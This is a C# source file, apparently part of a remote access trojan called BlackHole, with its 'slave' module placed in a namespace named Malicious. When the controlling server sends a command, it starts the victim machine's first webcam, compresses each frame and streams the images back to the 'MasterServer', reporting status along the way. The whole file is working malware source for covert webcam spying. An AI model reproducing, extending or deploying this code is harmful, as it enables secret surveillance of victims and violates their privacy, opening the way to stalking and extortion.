using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using AForge.Video.DirectShow;
using BlackHole.Common;
using BlackHole.Common.Helpers;
using BlackHole.Common.Network.Protocol;
using BlackHole.Slave.Helper;

namespace BlackHole.Slave.Malicious
{
    public class Webcam : Singleton<Webcam>, IMalicious
    {
        private VideoCapabilities[] VideoCapabilities => _videoDevice?.VideoCapabilities;
        private VideoCaptureDevice _videoDevice;
        private FilterInfoCollection _videoDevices;

        private StartWebcamCaptureMessage _startMessage;

        public void Initialize()
        {
            _videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            //foreach (FilterInfo device in _videoDevices)
                //devicesCombo.Items.Add(device.Name);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public void StartScreenCapture(StartWebcamCaptureMessage message)
        {
            _startMessage = message;
            MasterServer.Instance.SendStatus(message.WindowId, "Webcam capture", "Started capturing webcam...");

            _videoDevice = new VideoCaptureDevice(_videoDevices[0].MonikerString);
            _videoDevice.NewFrame += _videoDevice_NewFrame;
            
            _videoDevice.VideoResolution = VideoCapabilities[0];
            _videoDevice.Start();

            /////////////////////////

            //foreach (var capabilty in VideoCapabilities)
            //videoResolutionsCombo.Items.Add($"{capabilty.FrameSize.Width} x {capabilty.FrameSize.Height}");

            //if (VideoCapabilities.Length == 0)
            //videoResolutionsCombo.Items.Add("Not supported");

        }

        private void _videoDevice_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            var bitmapArray = ImageHelpers.CompressImage(eventArgs.Frame, _startMessage.Quality);

            MasterServer.Instance.ExecuteComplexSendOperation(_startMessage.WindowId,
                         "Webcam capture",
                         () => new WebcamCaptureMessage
                         {
                             RawImage = bitmapArray,
                             Width = _videoDevice.VideoResolution.FrameSize.Width,
                             Height = _videoDevice.VideoResolution.FrameSize.Height,
                             Quality = _startMessage.Quality,
                             ScreenNumber = _startMessage.ScreenNumber,
                             FrameRate = _videoDevice.VideoResolution.AverageFrameRate
                         });
        }

        public void StopScreenCapture(StopWebcamCaptureMessage message)
        {
            _videoDevice.Stop();
            MasterServer.Instance.SendStatus(message.WindowId, "Webcam capture", "Stopped capturing...");
        }
    }
}